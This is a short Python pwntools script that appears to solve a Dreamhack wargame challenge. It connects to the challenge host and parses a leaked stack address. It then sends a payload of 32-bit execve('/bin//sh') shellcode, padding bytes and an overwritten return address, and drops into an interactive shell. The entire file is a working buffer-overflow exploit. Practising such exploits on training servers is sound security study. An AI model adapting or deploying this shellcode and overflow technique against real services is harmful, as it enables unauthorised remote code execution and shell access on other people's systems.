from pwn import *

p = remote("host1.dreamhack.games", 9159)

tmp = p.recvuntil('\n')
print(tmp[7:-2])
ret_address = int(tmp[7:-2],16)
print(ret_address)

code = b"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80"
code += b"\x80"*106
code += p32(ret_address)
print(code)

p.send(code)
p.interactive()
p.close()
